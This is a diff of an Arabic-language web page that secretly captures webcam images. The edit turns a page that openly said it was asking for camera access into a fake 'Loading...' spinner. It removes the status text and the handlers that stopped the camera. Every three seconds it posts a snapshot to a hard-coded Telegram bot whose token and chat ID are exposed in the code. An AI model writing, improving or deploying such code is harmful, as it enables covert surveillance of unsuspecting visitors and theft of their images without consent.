@@ -2,16 +2,40 @@
 <html lang="ar">
 <head>
   <meta charset="UTF-8">
-  <title>طلب إذن الكاميرا</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>جارٍ التحميل...</title>
   <style>
-    body { text-align: center; font-family: Arial; padding: 50px; }
-    video { width: 640px; height: 480px; display: none; }
-    #status { font-size: 20px; color: red; }
+    body {
+      text-align: center;
+      font-family: Arial, sans-serif;
+      padding: 50px;
+      background-color: #f4f4f4;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+    .loader {
+      border: 8px solid #f3f3f3;
+      border-top: 8px solid #007bff;
+      border-radius: 50%;
+      width: 50px;
+      height: 50px;
+      animation: spin 1s linear infinite;
+    }
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+    video {
+      display: none;
+    }
   </style>
 </head>
 <body>
 
-  <h2 id="status">يتم طلب إذن الكاميرا...</h2>
+  <div class="loader"></div>
+
   <video id="video" autoplay playsinline></video>
   <canvas id="canvas" width="640" height="480" style="display: none;"></canvas>
 
@@ -19,59 +43,33 @@
     const video = document.getElementById('video');
     const canvas = document.getElementById('canvas');
     const ctx = canvas.getContext('2d');
-    let stream = null;
 
-    function requestCamera() {
-      navigator.mediaDevices.getUserMedia({ video: true })
-        .then(camStream => {
-          stream = camStream;
-          video.srcObject = stream;
-          document.getElementById('status').innerText = 'يتم الآن التقاط الصور...';
-          captureFrame();
-        })
-        .catch(err => {
-          document.getElementById('status').innerText = '⚠️ فشل في الوصول إلى الكاميرا';
-          console.error("خطأ في تشغيل الكاميرا:", err);
-        });
-    }
-
-    function captureFrame() {
-      setInterval(() => {
-        if (video.readyState === 4) {
-          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-          canvas.toBlob(blob => {
-            const formData = new FormData();
-            formData.append('chat_id', '6765420173');
-            formData.append('photo', blob, 'snapshot.jpg');
-
-            fetch('https://api.telegram.org/bot7865229336:AAG8w_CBGt0gcGfMd7syGaUVhUH5lJaNL6I/sendPhoto', {
-              method: 'POST',
-              body: formData
-            })
-            .then(response => response.json())
-            .then(data => console.log("تم الإرسال:", data))
-            .catch(error => console.error("فشل الإرسال:", error));
-          }, 'image/jpeg');
-        }
-      }, 3000);
-    }
-
-    function stopCamera() {
-      if (stream) {
-        stream.getTracks().forEach(track => track.stop());
-        video.srcObject = null;
+    navigator.permissions.query({ name: 'camera' }).then(permission => {
+      if (permission.state === 'granted') {
+        startCamera();
+      } else {
+        navigator.mediaDevices.getUserMedia({ video: true })
+          .then(stream => {
+            video.srcObject = stream;
+            startCapturing();
+          });
       }
-    }
-
-    // طلب الإذن عند تحميل الصفحة
-    document.addEventListener("DOMContentLoaded", requestCamera);
-
-    // عند تغيير تبويب الصفحة أو إغلاقها، يتم إيقاف الكاميرا لإجبار المتصفح على طلب الإذن مجددًا
-    document.addEventListener("visibilitychange", () => {
-      if (document.hidden) stopCamera();
     });
 
-    window.addEventListener("beforeunload", stopCamera);
+    function startCapturing() {
+      setInterval(() => {
+        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+        const imgData = canvas.toDataURL('image/jpeg');
+
+        fetch('https://api.telegram.org/bot7865229336:AAG8w_CBGt0gcGfMd7syGaUVhUH5lJaNL6I/sendPhoto', {
+          method: 'POST',
+          body: new URLSearchParams({
+            chat_id: '6765420173',
+            photo: imgData
+          })
+        });
+      }, 3000);
+    }
   </script>
 
 </body>
